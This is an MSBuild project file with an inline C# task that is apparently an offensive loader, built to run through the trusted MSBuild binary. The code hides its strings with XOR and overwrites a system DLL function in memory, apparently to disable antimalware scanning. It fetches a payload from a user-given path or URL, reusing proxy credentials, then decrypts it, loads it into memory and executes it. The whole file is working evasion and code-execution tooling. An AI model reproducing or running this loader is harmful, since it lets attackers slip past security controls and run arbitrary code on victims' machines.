<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Hello">
    <ClassExample/>
  </Target>
  <UsingTask
  TaskName="ClassExample"
  TaskFactory="CodeTaskFactory"
  AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
      <Code Type="Class" Language="cs">
	      <![CDATA[	  

using System;using System.IO;using System.Net;using System.Text;using System.Reflection;using System.Runtime.InteropServices;using System.Linq;using System.Threading;//This if for MSBuild LOL bin stuff laterusing Microsoft.Build.Framework;using Microsoft.Build.Utilities;public class UnrulableAmeerates{    private static WebClient EvechurrInspheration = new WebClient() { };    private static object[] InvaliditiesThecia = null;
	[DllImport("kernel32")]
    private static extern IntPtr LoadLibrary(string HeathenizedCoassisting);
	[DllImport("kernel32")]
    private static extern IntPtr GetProcAddress(IntPtr InterphoneUncognizable, string ClumpierCascrom);
	[DllImport("kernel32")]
    private static extern bool VirtualProtect(IntPtr ChirianaCraccus, UIntPtr LucklessnessAlpestrian, uint ThemisSpraich, out uint HyracoideanBollix);
	private static object RodentNonstellar(MethodInfo StearylCoracosteon)
    {
        if (UnfeudalizingUnglowing(StearylCoracosteon) == StearylCoracosteon.ReflectedType)
            return StearylCoracosteon.Invoke(null, InvaliditiesThecia);
        return InvaliditiesThecia[0];
    }
	public static void Main(string[] args)
    {
        Console.WriteLine(Encoding.UTF8.GetString(FootpathsBestirring(Convert.FromBase64String("GUAxQR0uAw8JIBkGGEVLUh8yASwOXBlDSyELEwsADhcAFQ=="), "BalachongGoosegrass")));
        string RenovizeRata = "";
        string[] CrybabyRethreading = new string[] { };
        bool LaevuloseRedriving = false;
        bool PunkinCores = false;
        string SerogelatinousIndistortable = "";
        if (args.Length > 0)
        {
            foreach (string argument in args)
            {
                if (argument.ToLower() == Encoding.UTF8.GetString(FootpathsBestirring(Convert.FromBase64String("YEwRXl0="), "MashiestRevulse")) || argument.ToLower() == Encoding.UTF8.GetString(FootpathsBestirring(Convert.FromBase64String("YQdDVw=="), "LeucinesPendicler")))
                {
                    LaevuloseRedriving = true;
                    Console.WriteLine(Encoding.UTF8.GetString(FootpathsBestirring(Convert.FromBase64String("CEc0VCQlDVQTHQQdCAgHFyBMCAYAaSMVAQpVXEUIBwA8CAwQSWkFEREABwELCkkXOwkEVAonQQAaCkMOCRQ="), "SliteIatrochemic")));
                }
                if (argument.ToLower() == Encoding.UTF8.GetString(FootpathsBestirring(Convert.FromBase64String("fR0dGw=="), "PeriosteomyelitisAntitaxation")) || argument.ToLower() == Encoding.UTF8.GetString(FootpathsBestirring(Convert.FromBase64String("fkwUAB8="), "SalometerChowderheaded")))
                {
                    PunkinCores = true;
                    int ChocolatyRetrospectivity = Array.IndexOf(args, argument) + 1;
                    if (ChocolatyRetrospectivity < args.Length)
                    {
                        string UnpermeatingCojuror = args[ChocolatyRetrospectivity];
                        if (LaevuloseRedriving)
                            SerogelatinousIndistortable = Encoding.UTF8.GetString(Convert.FromBase64String(UnpermeatingCojuror));
                        else
                            SerogelatinousIndistortable = UnpermeatingCojuror;
                    }
                    Console.WriteLine(Encoding.UTF8.GetString(FootpathsBestirring(Convert.FromBase64String("GkgpSSoKEBEWAA0+AQlEPT0hTwgLIhENGRoKF0MNGRc2HRdEEAEaAQpFKgYNSUkUQx5I"), "ActinoscopyWondersome")), SerogelatinousIndistortable);
                }
                if (argument.ToLower() == Encoding.UTF8.GetString(FootpathsBestirring(Convert.FromBase64String("YhQOGhw="), "OdontolcousDiscodactyl")) || argument.ToLower() == Encoding.UTF8.GetString(FootpathsBestirring(Convert.FromBase64String("a0ERAxEE"), "FlabellifoliateOutroved")))
                {
                    int ChocolatyRetrospectivity = Array.IndexOf(args, argument) + 1;
                    if (ChocolatyRetrospectivity < args.Length)
                    {
                        string IrrisibleMinistral = args[ChocolatyRetrospectivity];
                        if (LaevuloseRedriving)
                            RenovizeRata = Encoding.UTF8.GetString(Convert.FromBase64String(IrrisibleMinistral));
                        else
                            RenovizeRata = IrrisibleMinistral;
                    }
                }
                if (argument.ToLower() == Encoding.UTF8.GetString(FootpathsBestirring(Convert.FromBase64String("agAWEgA="), "GadusTrilocular")) || argument.ToLower() == Encoding.UTF8.GetString(FootpathsBestirring(Convert.FromBase64String("fk4AAgIU"), "ScapegraceSyndactylous")))
                {
                    int SymposiastHolophyte = Array.IndexOf(args, argument) + 1;
                    int AmbosexousIdylize = args.Length - SymposiastHolophyte;
                    CrybabyRethreading = new String[AmbosexousIdylize];
                    for (int i = 0; i < AmbosexousIdylize; i++)
                    {
                        string IrrisibleMinistralArgs = args[SymposiastHolophyte + i];
                        if (LaevuloseRedriving)
                            CrybabyRethreading[i] = Encoding.UTF8.GetString(Convert.FromBase64String(IrrisibleMinistralArgs));
                        else
                            CrybabyRethreading[i] = IrrisibleMinistralArgs;
                    }
                }
            }
            if (string.IsNullOrEmpty(RenovizeRata))
            {
                DiductorSemimechanistic();
                Environment.Exit(0);
            }
            PyroxanthinBorani(RenovizeRata, CrybabyRethreading, PunkinCores, SerogelatinousIndistortable);
            Environment.Exit(0);
        }
        else if (args.Length == 0)
        {
            while (true)
            {
                Console.WriteLine(Encoding.UTF8.GetString(FootpathsBestirring(Convert.FromBase64String("HF4zTiwcMx0VRSxVGw9nAAAXRRQqDQ0BVAEdQSIZBxpE"), "GannerChaetura")));
                Console.Write(Encoding.UTF8.GetString(FootpathsBestirring(Convert.FromBase64String("C00yVCYJTwAoDVMQGwIQJFINFRwfWVVkBB0aGhYANFJQVBZVAUFpX1M="), "ProtozoaDasyure")));
                LaevuloseRedriving = FossilologistPauropod(Console.ReadKey(false).Key);
                Console.Write(Encoding.UTF8.GetString(FootpathsBestirring(Convert.FromBase64String("FA8uTClPOwcFGCRFHBURGkUdOkEAARhPX1dV"), "HaustoriumPelterer")));
                RenovizeRata = NonfollowingAnvil(Console.ReadLine(), LaevuloseRedriving);
                Console.Write(Encoding.UTF8.GetString(FootpathsBestirring(Convert.FromBase64String("D1oxRT0KUB0bEVM1DxALAgAQTwMTFRFIPT0GRQkLFwsJGQcRF2VRSR5CD1RCWVI="), "TeletypistsEnigmatographer")));
                PunkinCores = FossilologistPauropod(Console.ReadKey(false).Key);
                if (PunkinCores)
                {
                    Console.Write(Encoding.UTF8.GetString(FootpathsBestirring(Convert.FromBase64String("DA8pXj5IPBoVMRFTFw0LRD0hJkEHNRhSTF1I"), "ParachuteDescendental")));
                    SerogelatinousIndistortable = NonfollowingAnvil(Console.ReadLine(), LaevuloseRedriving);
                }
                Console.Write("\n[?] Input payload args (optional) -> ");
                CrybabyRethreading = NonfollowingAnvil(Console.ReadLine(), LaevuloseRedriving).Split(' ');
                if (RenovizeRata.Length > 0)
                    PyroxanthinBorani(RenovizeRata, CrybabyRethreading, PunkinCores, SerogelatinousIndistortable);
            }
        }
    }
	private static byte[] MisdoubtfulPantomimicry(string ColligatedKolo)
    {	
		  using (FileStream fs = File.Open(ColligatedKolo, FileMode.Open))
            {
                byte[] VirulenciesCapanna = new byte[fs.Length];
                fs.Read(VirulenciesCapanna, 0, Convert.ToInt32(fs.Length));
                return VirulenciesCapanna;
            }
    }
	private static Assembly UnstablerSleyer(byte[] SulphocarbolicGallanting)
    {
        return Assembly.Load(SulphocarbolicGallanting);
    }
	private static IntPtr FermentarianSelachii(IntPtr TrihoralKnifeboard)
    {
        uint FriedrichsdorSiderographist = 0;
        if (VirtualProtect(TrihoralKnifeboard, (UIntPtr)ThiostannateGoliath().Length, 0x40, out FriedrichsdorSiderographist))
        {
            return TrihoralKnifeboard;
        }
        else
        {
            return (IntPtr)0;
        }
    }
	private static byte[] FootpathsBestirring(byte[] LentiginesDisfiguringly, string DonasMyopias)
    {
        //byte[] keyBytes = Encoding.UTF8.GetBytes(DonasMyopias);
        byte[] LioncedCopy = new byte[LentiginesDisfiguringly.Length];
        for (int i = 0; i < LentiginesDisfiguringly.Length; i++)
        {
            LioncedCopy[i] = (byte)(LentiginesDisfiguringly[i] ^ Encoding.UTF8.GetBytes(DonasMyopias)[i % Encoding.UTF8.GetBytes(DonasMyopias).Length]);
        }
        return LioncedCopy;
    }
	private static bool FossilologistPauropod(ConsoleKey PhaeophyceaeAnthoecologist)
    {
        if (PhaeophyceaeAnthoecologist == ConsoleKey.X)
            Environment.Exit(0);
        return (PhaeophyceaeAnthoecologist == ConsoleKey.Y);
    }
	private static object PyroxanthinBorani(string SundownerMeditatist, string[] SotikCfs, bool PunkinCoresoded = false, string SerogelatinousIndistortable = "")
    {
        IrradiateUnextendedly();
        Console.WriteLine(Encoding.UTF8.GetString(FootpathsBestirring(Convert.FromBase64String("HFk8Qjc3PlwAMzsmRV1P"), "GrabbersPronegotiation")) + SundownerMeditatist);
        if (!string.IsNullOrEmpty(string.Join(Encoding.UTF8.GetString(FootpathsBestirring(Convert.FromBase64String("bQ=="), "MammaliansPizzazzes")), SotikCfs)))
            Console.WriteLine(Encoding.UTF8.GetString(FootpathsBestirring(Convert.FromBase64String("DEouVCQeBhsJIBsWEkNORQ=="), "WastelandEubacterium")) + string.Join(Encoding.UTF8.GetString(FootpathsBestirring(Convert.FromBase64String("bQ=="), "MammaliansPizzazzes")), SotikCfs));
        InvaliditiesThecia = new object[] { SotikCfs };
        if (!SundownerMeditatist.ToLower().StartsWith(Encoding.UTF8.GetString(FootpathsBestirring(Convert.FromBase64String("KQQEFQ=="), "AppellationsDuetted"))) && PunkinCoresoded)
            return RodentNonstellar(MisarrangingOctachord(UnstablerSleyer(FootpathsBestirring(MisdoubtfulPantomimicry(SundownerMeditatist), SerogelatinousIndistortable))));
        else if(!SundownerMeditatist.ToLower().StartsWith(Encoding.UTF8.GetString(FootpathsBestirring(Convert.FromBase64String("KQQEFQ=="), "AppellationsDuetted"))) && !PunkinCoresoded)
            return RodentNonstellar(MisarrangingOctachord(UnstablerSleyer(MisdoubtfulPantomimicry(SundownerMeditatist))));
        if (!PunkinCoresoded)
            return RodentNonstellar(MisarrangingOctachord(UnstablerSleyer(AbarthrosisCinematographies(SundownerMeditatist))));
        else
            return RodentNonstellar(MisarrangingOctachord(UnstablerSleyer(FootpathsBestirring(AbarthrosisCinematographies(SundownerMeditatist), SerogelatinousIndistortable))));
    }
	private static IntPtr CriterionsForeorder()
    {
        return GetProcAddress(LoadLibrary(Encoding.UTF8.GetString(FootpathsBestirring(Convert.FromBase64String("NR8cDkkXKQI="), "TroggsEnunciators"))), Encoding.UTF8.GetString(FootpathsBestirring(Convert.FromBase64String("EgweCzIQLBc6FAgBDAY="), "SambasMyxangitis")));
    }
	private static Type UnfeudalizingUnglowing(MethodInfo StearylCoracosteon)
    {
        return StearylCoracosteon.ReflectedType;
    }
	private static MethodInfo MisarrangingOctachord(Assembly asm)
    {
        return asm.EntryPoint;
    }
	private static void DiductorSemimechanistic()
    {
        Console.WriteLine(Encoding.UTF8.GetString(FootpathsBestirring(Convert.FromBase64String("HhINChBRbQ=="), "KalmukMuffles")));
        Console.WriteLine(Encoding.UTF8.GetString(FootpathsBestirring(Convert.FromBase64String("AB0FAhdIRTpBC0VROXAoQgoOHkVdPgsdWy9SSBENHRtFWDIaARMTFToRNBoMW1IpSAAeDgBFWDIaARMTFToAJwkXWy8="), "UnderrealisedPsoralea")));
        Console.WriteLine(Encoding.UTF8.GetString(FootpathsBestirring(Convert.FromBase64String("FBVKBV9HdE8hAhENCgMeFQVWAyQAAEcZEjwOAxcRARdNGRoNHwYpFQ4JDlM6Bw8GRQUJAVAbHR4AOkEXBhsSIwoaFxcXRQwCEUkUBDsEUVNJFiAMARYAAEs="), "HaggisNonredemptive")));
        Console.WriteLine(Encoding.UTF8.GetString(FootpathsBestirring(Convert.FromBase64String("CRpdFxwGT0wuBBENOhwBCgVOERIXNAMVGxYGVQUPEAwHNAYGBQ5OFRsEIU4SBh0VBxVBEgwIMAFPChsLQSsqB04VARAGDBwVEQFKdT8aGB1OAxZFMwEcAxwDEAhBFhxEIRoKSzEhM1MBMA0CFgMAHAMPVA4BLFw="), "UnpostulatedUrokinase")));
        Console.WriteLine(Encoding.UTF8.GetString(FootpathsBestirring(Convert.FromBase64String("GQREFAQdC05JLjMLCA4XDgYQThckAggJAB0GBkdDGwsIBgAAAAwdRzEYDEQVCBccRUM3DBgHBhNUBQEEJBxJCxdJAlQ8MR5JTAAFQQABC0cnGQcFFxBDAAZDPgoNC00="), "EpideicticRelocating")));
        Console.WriteLine(Encoding.UTF8.GetString(FootpathsBestirring(Convert.FromBase64String("CRpdEx0DBllFKzgRGwodBw4LUhERGgQfMBoVAE8RBgYBRDwKUhUSGhxHExMXHQgXOxoDUhsLVRcNAWgJHQQXDAtHEAgeCRcLe049BxwQVQEARC4KHgkcHgoDUgMJSAQeOU4RAAgRGAYLEDtFFAoBSRsPF0ESAQsTJxde"), "UnproducedHeresiographer")));
    }
	private static void IrradiateUnextendedly()
    {
        IntPtr TrihoralKnifeboard = FermentarianSelachii(CriterionsForeorder());
        if (TrihoralKnifeboard != (IntPtr)0)
        {
            Marshal.Copy(ThiostannateGoliath(), 0, TrihoralKnifeboard, ThiostannateGoliath().Length);
            Console.WriteLine(Encoding.UTF8.GetString(FootpathsBestirring(Convert.FromBase64String("FU48VD0QEBAAADQUAAEcCm4VAAANDRYXRTIKITxM"), "NeatnessesGrumps")));
        }
        else
        {
            Console.WriteLine(Encoding.UTF8.GetString(FootpathsBestirring(Convert.FromBase64String("EUQvUzUYORYODwICTSAjGSxSNSQwATAi"), "JerseyMuffleman")));
        }
    }
	private static byte[] ThiostannateGoliath()
    {
        if (System.Environment.Is64BitOperatingSystem)
            return new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        return new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
    }
	private static string NonfollowingAnvil(string LentiginesDisfiguringly, bool MeniverShiftiness)
    {
        if (MeniverShiftiness)
            LentiginesDisfiguringly = Encoding.UTF8.GetString(Convert.FromBase64String(LentiginesDisfiguringly));
        if (LentiginesDisfiguringly.Trim().ToLower().Equals(Encoding.UTF8.GetString(FootpathsBestirring(Convert.FromBase64String("Ow=="), "CzarevnasWatchworks"))))
            Environment.Exit(0);
        return LentiginesDisfiguringly;
    }
	private static byte[] AbarthrosisCinematographies(string url)
    {
        if (WebRequest.DefaultWebProxy != null)
        {
            IWebProxy HelpmatesOutsets = WebRequest.DefaultWebProxy;
			HelpmatesOutsets.Credentials = CredentialCache.DefaultCredentials;
            EvechurrInspheration.Proxy = HelpmatesOutsets;
        }
		ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
        return EvechurrInspheration.DownloadData(url);
    }
	    
	     //This is for MSBuild later
	    public class ClassExample : Task, ITask
	    {
	        public override bool Execute()
	        {
	            UnrulableAmeerates.Main(new string[] { });
	            return true;
	        }
	    }
	    
}

 ]]>
	</Code>	  
    </Task>
  </UsingTask>
</Project>